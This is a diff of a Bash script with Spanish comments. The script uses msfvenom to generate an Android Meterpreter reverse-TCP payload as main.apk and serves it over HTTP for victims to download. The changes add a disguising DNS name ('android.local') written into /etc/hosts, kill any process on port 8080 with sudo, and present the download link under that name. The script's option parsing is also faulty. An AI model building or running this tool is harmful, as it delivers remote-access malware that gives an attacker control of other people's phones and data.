@@ -7,7 +7,7 @@ RESET="\e[0m"
 
 # Función para mostrar el uso del script
 usage() {
-    echo "Uso: $0 [-ip <IP_ADDRESS>] [-port <PORT>]"
+    echo "Uso: $0 [-ip <IP_ADDRESS>] [-port <PORT>] [-dns <DNS_NAME>]"
     exit 1
 }
 
@@ -24,19 +24,16 @@ print_red() {
 # Inicializar las variables
 LOCAL_IP=""
 PORT=""
+NAME_DNS=""
 
 # Procesar las opciones de línea de comandos
 while getopts ":ip:port:" opt; do
     case ${opt} in
-        ip )
-            LOCAL_IP=$OPTARG
-            ;;
-        port )
-            PORT=$OPTARG
-            ;;
-        \? )
-            usage
-            ;;
+        ip ) LOCAL_IP=$OPTARG;;
+        port ) PORT=$OPTARG;;
+        dns ) NAME_DNS=$OPTARG;;
+        -h|--help) usage ;;
+        \? ) usage ;;
     esac
 done
 
@@ -47,7 +44,14 @@ fi
 
 # Si no se proporcionó un puerto, usar un valor predeterminado
 if [[ -z "$PORT" ]]; then
-    PORT=4444
+    # Eliminamos los procesos que estén utilizando el puerto 8080
+    sudo fuser -k 8080/tcp &>/dev/null
+    PORT=8080
+fi
+
+# Si no se proporcionó un nombre de DNS, usar un valor predeterminado
+if [[ -z "$NAME_DNS" ]]; then
+    NAME_DNS="android.local"
 fi
 
 # Si no tenemos instalado msfvenom lo instalamos
@@ -62,10 +66,12 @@ fi
 
 # Eliminar si ya dispongo de un archivo main.apk
 if [ -f main.apk ]; then
+    print_red "El archivo main.apk ya está creado, eliminando..."
+    # Eliminar el archivo main.apk
     rm main.apk
-    print_red "Archivo main.apk eliminado."
 fi
 
+echo "Generando payload..."
 # Generar el payload de Android con msfvenom
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$PORT -o main.apk
 if [ $? -eq 0 ]; then
@@ -85,6 +91,8 @@ if ! command -v python3 &> /dev/null; then
     fi
 fi
 
+
+
 # Nos aseguramos que el puerto 8000 no esté en uso, si lo esta utilizamos otro
 while nc -z localhost 8000; do
     print_red "El puerto 8000 está en uso. Utilizando otro puerto..."
@@ -102,9 +110,12 @@ else
     exit 1
 fi
 
+# Añadimmos en nombre dns en el archivo hosts
+echo "$LOCAL_IP $NAME_DNS" | sudo tee -a /etc/hosts > /dev/null
+
 # Verificar si el archivo main.apk se generó correctamente
 if [ -f main.apk ]; then
-    print_green "Archivo main.apk disponible en http://$LOCAL_IP:$PORT/main.apk"
+    print_green "Archivo main.apk disponible en http://$NAME_DNS:$PORT/main.apk"
 else
     print_red "Error: main.apk no se generó correctamente."
     exit 1
